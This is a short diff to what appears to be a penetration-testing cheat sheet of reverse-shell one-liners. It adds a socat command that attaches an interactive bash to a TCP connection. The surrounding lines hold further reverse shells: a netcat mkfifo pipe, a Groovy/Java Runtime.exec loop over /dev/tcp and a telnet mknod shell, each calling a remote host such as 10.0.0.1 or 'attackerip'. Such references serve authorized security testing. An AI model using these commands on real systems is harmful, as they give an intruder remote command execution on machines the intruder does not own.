@@ -9,6 +9,7 @@ Many copied from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-sh
 ```
 
 socat file:`tty`,raw,echo=0 tcp-listen:4444 (listener)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4444 (client)
 ```
 #### Connect to remote POP3 Server
 socat - TCP4:10.1.1.1:110
@@ -88,6 +89,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
+
 ```
 #### Telnet
 rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
